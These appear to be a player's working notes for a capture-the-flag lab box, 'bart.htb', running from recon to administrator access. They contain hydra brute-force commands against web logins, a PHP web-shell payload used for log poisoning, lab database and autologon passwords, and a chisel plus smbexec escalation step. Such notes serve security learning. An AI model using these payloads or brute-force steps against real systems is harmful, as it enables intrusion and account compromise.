@@ -1,0 +1,82 @@
+# Recon
+## Comm Tcp
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://forum.bart.htb/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+## All Tcp
+same
+
+# Enum
+## 80 http
+redirect to forum.bart.htb, add to /etc/hosts
+
+RTFSC =>
+in the comments =>
+Harvey Potter
+h.potter@bart.htb
+Developer@BART
+and other emails s.brown@bart.htb, d.simmons@bart.htb, r.hilton@bart.htb
+<!-- Adding other employees breaks the CSS, I will fix it later. -->
+<link rel='stylesheet' id='sydney-ie9-css'  href='http://forum.bart.htb/wp-content/themes/sydney/css/ie9.css?ver=4.8.2' type='text/css' media='all' />
+
+also found wp-content => use wpscan
+wpscan --url http://forum.bart.htb --enumerate ap,u --plugins-detection aggressive --disable-tls-checks --wp-content-dir /wp-content
+=> nothing
+
+(get hint) gobuster bart.htb and ignore 200 => /monitor
+php server monitor 3.2.1, searchsploit, no matching version.
+
+by forget password, try user names => user name is harvey
+
+create a list of users, try => harvey
+hydra -L users.txt -P users.txt -I 'http-post-form://bart.htb/monitor/:csrf=3414a68455dbbdaf9ac187538c86c0941f9b9e210275d13e4b7c2b6a9bf0941f&user_name=^USER^&
+user_password=^PASS^&action=login:information is incorrect:H=Host\: bart.htb:H:Cookie\: PHPSESSID=unmvvtlbggdu4sslgdbjfonujf' -V
+
+wrote a script to extract php session and csrf => bf and got harvey:potter
+
+in server tab, find another website "http://internal-01.bart.htb/" => another login page.
+
+cat users.txt | awk '{if (length($0)>7) print}' > gt8.pass
+looks like the server will block you if you test so frequently, add -W 1 -t 1 to hydra =>
+hydra -I -V -L users.txt -P gt8.pass 'http-post-form://internal-01.bart.htb/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Invalid Username or Password:H=Cookie: PHPSESSID=cm1g32vc5a86ebg10ourfn4df4' -W 2 -t 1
+=> nothing, only false positive.
+
+sqlmap, nothing
+
+try using a different dictionary /usr/share/seclists/Passwords/... and use awk to filter the password whose length > 7
+aydra -I -V -L users.txt -P gt8.pass 'http-post-form://internal-01.bart.htb/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Invalid Username or Password:H=Cookie: PHPSESSID=cm1g32vc5a86ebg10ourfn4df4' -W 2 -t 1
+=> harvey:Password1
+
+enter, rtfsc => http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
+
+play with it and somehow i changed the returned response => (get hint) I changed log.txt to log.php and poisoned the log file, or something else.
+change agent to <?php echo system($_REQUEST['cmd']); ?> => powershell iex => get foothold
+(my theory, the log.php is to add the agent to log.txt, but if we change it to log.php, it add the agent to itself and will be treated as php code when we run log.php)
+
+# Priv Esc
+find C:\inetpub\wwwroot\internal-01\simple_chat\includes\dbconnect.php =>
+$con = @mysqli_connect('localhost', 'harvey', '!IC4nB3Th3B3st?', 'internal_chat');
+
+find C:\inetpub\wwwroot\monitor\config.php =>
+define('PSM_DB_HOST', 'localhost');
+define('PSM_DB_PORT', '3306');
+define('PSM_DB_NAME', 'sysmon');
+define('PSM_DB_USER', 'daniel');
+define('PSM_DB_PASS', '?St4r1ng1sCr33py?');
+
+whoami /all => impersonate => maybe juicy potato (?)
+
+find C:\inetpub\wwwroot\internal-01\log\microsoft\windows\powershell\ModuleAnalysisCache, not sure how to use (?)
+
+winpeas.exe => 
+DefaultDomainName             :  DESKTOP-7I3S68E                                                                                                                                                               
+DefaultUserName               :  Administrator                                                                                                                                                                 
+DefaultPassword               :  3130438f31186fbaf962f407711faddb
+
+somehow my run as script and Invoke-RunAs.ps1 doesn't work.
+
+!!!!!! (Get hint), we can use chisel.exe to forward 445 to our local and use smbexec!! => root!
